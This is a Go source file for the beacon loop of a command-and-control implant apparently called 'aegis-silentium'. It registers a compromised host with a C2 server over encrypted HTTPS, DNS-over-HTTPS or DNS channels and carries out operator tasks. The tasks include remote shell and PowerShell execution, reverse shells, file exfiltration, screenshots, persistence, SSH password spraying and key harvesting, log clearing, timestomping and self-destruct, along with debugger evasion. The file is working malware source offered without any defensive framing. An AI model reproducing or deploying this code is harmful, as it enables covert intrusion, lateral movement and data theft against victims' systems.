// Package beacon implements the main C2 beacon loop with multi-transport failover.
// Transport priority: HTTPS → DNS-over-HTTPS → raw DNS → (dead drop)
package beacon

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"math/rand"
	"os"
	"runtime"
	"sync"
	"time"

	"aegis-silentium/implant/config"
	"aegis-silentium/implant/crypto"
	"aegis-silentium/implant/evasion"
	"aegis-silentium/implant/exfil"
	"aegis-silentium/implant/lateral"
	"aegis-silentium/implant/module"
	"aegis-silentium/implant/objectives"
	"aegis-silentium/implant/opsec"
	"aegis-silentium/implant/persistence"
	"aegis-silentium/implant/privesc"
	"aegis-silentium/implant/recon"
	"aegis-silentium/implant/shell"
	"aegis-silentium/implant/traffic"
)

// ── Protocol types ────────────────────────────────────────────────────────────

// CheckinRequest is sent on first beacon to register the implant.
type CheckinRequest struct {
	HostID    string          `json:"hid"`
	Hostname  string          `json:"hn"`
	Username  string          `json:"un"`
	OS        string          `json:"os"`
	Arch      string          `json:"arch"`
	PID       int             `json:"pid"`
	HostInfo  *recon.HostInfo `json:"hi"`
	Profile   string          `json:"profile"`
}

// TaskResponse is what the C2 sends back on each beacon.
type TaskResponse struct {
	Tasks []Task `json:"tasks"`
}

// Task represents a single tasking from the C2.
type Task struct {
	ID      string          `json:"id"`
	Type    string          `json:"type"`
	Payload json.RawMessage `json:"payload"`
}

// TaskResult is sent back to C2 after executing a task.
type TaskResult struct {
	TaskID  string `json:"tid"`
	HostID  string `json:"hid"`
	Status  string `json:"status"` // "ok" | "error"
	Output  string `json:"output"`
	Error   string `json:"error,omitempty"`
}

// BeaconRequest is the standard polling message.
type BeaconRequest struct {
	HostID  string        `json:"hid"`
	Results []TaskResult  `json:"results,omitempty"`
}

// ── Agent ─────────────────────────────────────────────────────────────────────

// Agent is the main beacon agent.
// Agent is the main beacon agent.
type Agent struct {
	cfg       *config.Config
	hostInfo  *recon.HostInfo
	session   *crypto.Session
	keypair   *crypto.ECDHKeyPair
	transport Transport
	mu        sync.Mutex
	pending   []TaskResult
	registry  *module.Registry
	scheduler *traffic.Scheduler
	decoys    *traffic.DecoyEmitter
	objExec   *objectives.Executor
}

// NewAgent constructs an Agent.
// NewAgent constructs an Agent with all isolation and traffic shaping initialized.
func NewAgent(cfg *config.Config, hostInfo *recon.HostInfo) *Agent {
	return &Agent{
		cfg:      cfg,
		hostInfo: hostInfo,
		registry: module.NewRegistry(),
		scheduler: traffic.NewScheduler(cfg),
		decoys:   traffic.NewDecoyEmitter(cfg.Profile, cfg.UserAgent),
		objExec:  objectives.NewExecutor(cfg, nil), // session set after initSession()
	}
}

// Run is the main beacon loop. It never returns (except on kill date or self-destruct).
func (a *Agent) Run() {
	// Establish crypto session
	a.initSession()
	a.objExec = objectives.NewExecutor(a.cfg, a.session) // rebind with live session

	// Initial checkin
	a.checkin()

	for {
		// Kill date check
		if !a.cfg.KillDate.IsZero() && time.Now().After(a.cfg.KillDate) {
			opsec.SelfDestruct()
			os.Exit(0)
		}

		// Working hours gate
		if a.cfg.WorkingHours[0] != 0 || a.cfg.WorkingHours[1] != 0 {
			h := time.Now().Hour()
			if h < a.cfg.WorkingHours[0] || h >= a.cfg.WorkingHours[1] {
				time.Sleep(5 * time.Minute)
				continue
			}
		}

		// Re-check sandbox periodically (VM snapshot detection)
		if evasion.IsBeingDebugged() {
			time.Sleep(60 * time.Second)
			continue
		}

		// Beacon
		tasks := a.beacon()

		// Dispatch tasks concurrently (max 4 parallel)
		if len(tasks) > 0 {
			sem := make(chan struct{}, 4)
			var wg sync.WaitGroup
			for _, t := range tasks {
				wg.Add(1)
				sem <- struct{}{}
				go func(task Task) {
					defer wg.Done()
					defer func() { <-sem }()
					result := a.dispatch(task)
					a.mu.Lock()
					a.pending = append(a.pending, result)
					a.mu.Unlock()
				}(t)
			}
			wg.Wait()
		}

		// Sleep with jitter
		a.sleep()
	}
}

// initSession performs ECDH key exchange with the relay to establish a session key.
func (a *Agent) initSession() {
	var err error
	for {
		a.keypair, err = crypto.NewECDHKeyPair()
		if err != nil {
			time.Sleep(30 * time.Second)
			continue
		}

		// Select transport
		a.transport = a.selectTransport()

		// Send our ephemeral public key, receive relay's public key
		relayPub, err := a.transport.KeyExchange(a.keypair.Pub)
		if err != nil {
			time.Sleep(30 * time.Second)
			continue
		}

		info := []byte("aegis-silentium-session-v5")
		a.session, err = a.keypair.DeriveSession(relayPub, info)
		if err != nil {
			time.Sleep(30 * time.Second)
			continue
		}
		break
	}
}

// checkin sends the initial registration to the C2.
func (a *Agent) checkin() {
	hostname, _ := os.Hostname()
	req := CheckinRequest{
		HostID:   a.cfg.HostID,
		Hostname: hostname,
		Username: currentUser(),
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		PID:      os.Getpid(),
		HostInfo: a.hostInfo,
		Profile:  a.cfg.Profile,
	}
	data, _ := json.Marshal(req)

	for {
		if err := a.transport.Checkin(a.session, data); err != nil {
			time.Sleep(30 * time.Second)
			continue
		}
		break
	}
}

// beacon sends pending results and receives new tasks.
func (a *Agent) beacon() []Task {
	a.mu.Lock()
	results := a.pending
	a.pending = nil
	a.mu.Unlock()

	req := BeaconRequest{
		HostID:  a.cfg.HostID,
		Results: results,
	}
	data, _ := json.Marshal(req)

	raw, err := a.transport.Beacon(a.session, data)
	if err != nil {
		// Transport failure — try failover
		a.transport = a.selectTransport()
		return nil
	}

	var resp TaskResponse
	if err := json.Unmarshal(raw, &resp); err != nil {
		return nil
	}
	return resp.Tasks
}

// dispatch executes a single task and returns its result.
func (a *Agent) dispatch(t Task) TaskResult {
	result := TaskResult{TaskID: t.ID, HostID: a.cfg.HostID, Status: "ok"}

	switch t.Type {

	// ── Shell / Exec ──────────────────────────────────────────────────────────
	case "shell":
		var p struct{ Cmd string `json:"cmd"` }
		json.Unmarshal(t.Payload, &p)
		out, err := shell.Exec(p.Cmd)
		result.Output = out
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		}

	case "powershell":
		var p struct{ Cmd string `json:"cmd"` }
		json.Unmarshal(t.Payload, &p)
		out, err := shell.ExecPowerShell(p.Cmd)
		result.Output = out
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		}

	case "reverse_shell":
		var p struct {
			Host string `json:"host"`
			Port int    `json:"port"`
		}
		json.Unmarshal(t.Payload, &p)
		go shell.ReverseShell(p.Host, p.Port) // async, non-blocking
		result.Output = fmt.Sprintf("reverse shell → %s:%d", p.Host, p.Port)

	// ── File Operations ───────────────────────────────────────────────────────
	case "upload":
		var p struct {
			Path    string `json:"path"`
			Content []byte `json:"content"`
		}
		json.Unmarshal(t.Payload, &p)
		err := os.WriteFile(p.Path, p.Content, 0755)
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			result.Output = "written"
		}

	case "download":
		var p struct{ Path string `json:"path"` }
		json.Unmarshal(t.Payload, &p)
		data, err := os.ReadFile(p.Path)
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			result.Output = string(data) // base64 encoding handled by relay
		}

	case "exfil_file":
		var p struct {
			Path    string `json:"path"`
			Channel string `json:"channel"` // "https"|"doh"|"dns"
		}
		json.Unmarshal(t.Payload, &p)
		err := exfil.ExfilFile(p.Path, p.Channel, a.cfg, a.session)
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			result.Output = "exfiltrated"
		}

	case "screenshot":
		imgData, err := exfil.Screenshot()
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			result.Output = string(imgData)
		}

	case "ls":
		var p struct{ Path string `json:"path"` }
		json.Unmarshal(t.Payload, &p)
		if p.Path == "" {
			p.Path = "."
		}
		entries, err := os.ReadDir(p.Path)
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			var buf bytes.Buffer
			for _, e := range entries {
				info, _ := e.Info()
				if info != nil {
					fmt.Fprintf(&buf, "%s\t%d\t%s\n",
						e.Name(), info.Size(), info.Mode())
				}
			}
			result.Output = buf.String()
		}

	// ── Recon ─────────────────────────────────────────────────────────────────
	case "sysinfo":
		info := recon.Collect()
		data, _ := json.Marshal(info)
		result.Output = string(data)

	case "ps":
		procs, err := recon.ProcessList()
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			data, _ := json.Marshal(procs)
			result.Output = string(data)
		}

	case "whoami":
		result.Output = currentUser()

	case "netstat":
		conns, _ := recon.NetworkConnections()
		data, _ := json.Marshal(conns)
		result.Output = string(data)

	// ── Persistence ───────────────────────────────────────────────────────────
	case "persist":
		var p struct {
			Method  string `json:"method"`  // "cron"|"systemd"|"registry"|"wmi"
			Path    string `json:"path"`    // implant binary path on disk
			Name    string `json:"name"`    // service/task name
		}
		json.Unmarshal(t.Payload, &p)
		err := persistence.Install(p.Method, p.Path, p.Name)
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			result.Output = "persistence installed: " + p.Method
		}

	case "unpersist":
		var p struct {
			Method string `json:"method"`
			Name   string `json:"name"`
		}
		json.Unmarshal(t.Payload, &p)
		err := persistence.Remove(p.Method, p.Name)
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			result.Output = "removed"
		}

	// ── Privilege Escalation ──────────────────────────────────────────────────
	case "privesc_check":
		findings, err := privesc.Check()
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			data, _ := json.Marshal(findings)
			result.Output = string(data)
		}

	// ── Lateral Movement ──────────────────────────────────────────────────────
	case "ssh_spray":
		var p struct {
			Targets  []string `json:"targets"`
			Users    []string `json:"users"`
			Passwords []string `json:"passwords"`
			Keys     []string `json:"keys"`
		}
		json.Unmarshal(t.Payload, &p)
		hits, err := lateral.SSHSpray(p.Targets, p.Users, p.Passwords, p.Keys)
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			data, _ := json.Marshal(hits)
			result.Output = string(data)
		}

	case "ssh_exec":
		var p struct {
			Host     string `json:"host"`
			User     string `json:"user"`
			Password string `json:"password"`
			Key      string `json:"key"`
			Cmd      string `json:"cmd"`
		}
		json.Unmarshal(t.Payload, &p)
		out, err := lateral.SSHExec(p.Host, p.User, p.Password, p.Key, p.Cmd)
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			result.Output = out
		}

	case "ssh_harvest_keys":
		keys, err := lateral.HarvestSSHKeys()
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			data, _ := json.Marshal(keys)
			result.Output = string(data)
		}

	// ── OPSEC ─────────────────────────────────────────────────────────────────
	case "clear_logs":
		var p struct{ What []string `json:"what"` }
		json.Unmarshal(t.Payload, &p)
		opsec.ClearLogs(p.What)
		result.Output = "logs cleared"

	case "timestomp":
		var p struct {
			Path   string `json:"path"`
			RefPath string `json:"ref"`
		}
		json.Unmarshal(t.Payload, &p)
		err := opsec.Timestomp(p.Path, p.RefPath)
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			result.Output = "timestomped"
		}

	case "secure_delete":
		var p struct{ Path string `json:"path"` }
		json.Unmarshal(t.Payload, &p)
		err := opsec.SecureDelete(p.Path)
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			result.Output = "deleted"
		}

	case "self_destruct":
		go func() {
			time.Sleep(2 * time.Second)
			opsec.SelfDestruct()
			os.Exit(0)
		}()
		result.Output = "self-destruct initiated"

	// ── Session ───────────────────────────────────────────────────────────────
	case "sleep":
		var p struct {
			Interval int `json:"interval"`
			Jitter   int `json:"jitter"`
		}
		json.Unmarshal(t.Payload, &p)
		if p.Interval > 0 {
			a.cfg.SleepInterval = time.Duration(p.Interval) * time.Second
		}
		if p.Jitter >= 0 && p.Jitter <= 100 {
			a.cfg.JitterPct = p.Jitter
		}
		result.Output = fmt.Sprintf("sleep=%d jitter=%d%%",
			int(a.cfg.SleepInterval.Seconds()), a.cfg.JitterPct)

	case "kill":
		os.Exit(0)

	default:
		result.Status = "error"
		result.Error = fmt.Sprintf("unknown task type: %s", t.Type)
	}

	return result
}

// sleep sleeps for the configured interval with jitter applied.
func (a *Agent) sleep() {
	base := a.cfg.SleepInterval
	jPct := a.cfg.JitterPct
	if jPct == 0 {
		time.Sleep(base)
		return
	}
	// jitter: ±jPct% of base
	maxJitter := int64(base) * int64(jPct) / 100
	delta := rand.Int63n(maxJitter*2) - maxJitter
	actual := time.Duration(int64(base) + delta)
	if actual < 1*time.Second {
		actual = 1 * time.Second
	}
	time.Sleep(actual)
}

// selectTransport picks the best available transport.
func (a *Agent) selectTransport() Transport {
	// Always try HTTPS first
	ctx := context.Background()
	for _, addr := range a.cfg.C2Addresses {
		t := NewHTTPSTransport(addr, a.cfg)
		if t.Probe(ctx) == nil {
			return t
		}
	}
	// Fall back to DNS-over-HTTPS
	if a.cfg.DoHURL != "" && a.cfg.C2Domain != "" {
		return NewDoHTransport(a.cfg)
	}
	// Last resort: raw DNS
	if a.cfg.C2Domain != "" {
		return NewDNSTransport(a.cfg)
	}
	// Default: return HTTPS with first address regardless
	return NewHTTPSTransport(a.cfg.C2Addresses[0], a.cfg)
}

func currentUser() string {
	if u := os.Getenv("USER"); u != "" {
		return u
	}
	if u := os.Getenv("USERNAME"); u != "" {
		return u
	}
	return "unknown"
}

// ── Module-isolated dispatch ─────────────────────────────────────────────────

// dispatchIsolated wraps dispatch() with module registry isolation.
// Panics in any capability module are caught and converted to errors;
// the beacon loop continues uninterrupted.
func (a *Agent) dispatchIsolated(t Task) TaskResult {
	ctx        := context.Background()
	moduleName := taskToModule(t.Type)

	out, err := a.registry.Exec(ctx, moduleName, func() (string, error) {
		result := a.dispatch(t)
		if result.Status == "error" {
			return result.Output, errors.New(result.Error)
		}
		return result.Output, nil
	})

	if err != nil {
		return TaskResult{
			TaskID: t.ID,
			HostID: a.cfg.HostID,
			Status: "error",
			Error:  err.Error(),
			Output: out,
		}
	}
	return TaskResult{
		TaskID: t.ID,
		HostID: a.cfg.HostID,
		Status: "ok",
		Output: out,
	}
}

// taskToModule maps a task type string to its module registry name.
// Task types that match dispatch() cases exactly — no phantom cases.
func taskToModule(taskType string) string {
	switch taskType {
	case "shell", "powershell", "reverse_shell":
		return "shell"
	case "sysinfo", "ps", "netstat", "whoami", "ls":
		return "recon"
	case "upload", "download", "exfil_file", "screenshot", "clipboard":
		return "exfil"
	case "persist", "unpersist":
		return "persistence"
	case "privesc_check":
		return "privesc"
	case "ssh_spray", "ssh_exec", "ssh_harvest_keys":
		return "lateral"
	case "clear_logs", "timestomp", "secure_delete", "self_destruct":
		return "opsec"
	case "run_objective":
		return "objectives"
	}
	// Unknown tasks fall into the shell module (safe default with CB).
	return "shell"
}
